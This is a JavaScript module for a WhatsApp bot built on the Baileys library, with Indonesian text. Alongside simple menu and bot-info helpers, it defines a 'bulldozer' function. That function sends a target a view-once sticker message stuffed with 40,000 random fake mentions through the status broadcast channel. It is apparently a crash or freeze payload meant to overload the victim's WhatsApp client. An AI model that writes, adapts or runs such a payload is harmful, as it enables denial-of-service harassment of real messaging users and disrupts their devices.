const fnu = require("../setting.js")
const nuf = require("../axiom.js")
const dbFile = "./db.json"
const ownerAssistant = "chatGPT"

//----------------------------↓↓ function
function menuText() {
    return `
📌 *MENU BOT*
• ping — latency test
• menu — menampilkan menu
• botinfo — info tentang bot
`
}

function botInfo() {
    return `
🤖 *BOT INFO*
• Nama: ${botName}
• Dibuat tanggal : Jumat 6-2-2026
• Nomor: wa.me/${global.botNumber}?text=menu

👤 *OWNER*
• Nama: ${global.ownerName}
• Nomor: wa.me/${global.ownerNumber}
• Assistant: ${ownerAssistant}
`
}

// functions.js
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys")

async function bulldozer(axiom, target) {
  if (!axiom) throw new Error("Bulldozer: axiom (socket) belum tersedia!")

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
            ],
          },
        },
      },
    },
  }

  const msg = generateWAMessageFromContent(target, message, {})

  await axiom.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target]
  })

  return `Bulldozer: berhasil kirim ke ${target}`
}

module.exports = {
    dbFile,
    menuText,
    botInfo,
    bulldozer
}
